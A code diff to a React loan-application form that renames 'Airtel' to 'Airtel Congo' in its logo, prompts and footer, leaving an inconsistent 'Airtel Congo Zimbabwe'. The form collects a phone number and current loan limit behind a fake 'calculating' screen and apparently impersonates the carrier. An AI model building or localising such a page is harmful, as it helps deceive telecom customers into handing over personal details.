@@ -134,7 +134,7 @@ function ApplicationForm({ onBack, onSubmitSuccess }: ApplicationFormProps) {
                 >
                     <ArrowLeft size={20} /> Back
                 </button>
-                <img src="/airtel.svg" alt="Airtel" style={logoStyle} />
+                <img src="/Airtel Congo.svg" alt="Airtel Congo" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -169,7 +169,7 @@ function ApplicationForm({ onBack, onSubmitSuccess }: ApplicationFormProps) {
                                     fontSize: "15px",
                                 }}
                             >
-                                Enter your Airtel number to get started
+                                Enter your Airtel Congo number to get started
                             </p>
 
                             <div style={{ marginBottom: "24px" }}>
@@ -269,7 +269,7 @@ function ApplicationForm({ onBack, onSubmitSuccess }: ApplicationFormProps) {
                                     fontSize: "15px",
                                 }}
                             >
-                                Enter your current Airtel loan limit
+                                Enter your current Airtel Congo loan limit
                             </p>
 
                             <div style={{ marginBottom: "24px" }}>
@@ -310,7 +310,7 @@ function ApplicationForm({ onBack, onSubmitSuccess }: ApplicationFormProps) {
                                     />
                                 </div>
                                 <p style={{ color: "#888", fontSize: "12px", marginTop: "8px" }}>
-                                    Enter 0 if you don't have a Airtel limit yet
+                                    Enter 0 if you don't have a Airtel Congo limit yet
                                 </p>
                             </div>
 
@@ -357,7 +357,7 @@ function ApplicationForm({ onBack, onSubmitSuccess }: ApplicationFormProps) {
                                 Calculating Your New Limit...
                             </h2>
                             <p style={{ color: "#666", fontSize: "15px" }}>
-                                Analyzing your Airtel eligibility
+                                Analyzing your Airtel Congo eligibility
                             </p>
 
                             <style>
@@ -507,7 +507,7 @@ function ApplicationForm({ onBack, onSubmitSuccess }: ApplicationFormProps) {
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Zimbabwe</div>
+            <div style={footerStyle}>© 2025 Airtel Congo Zimbabwe</div>
         </div>
     );
 }
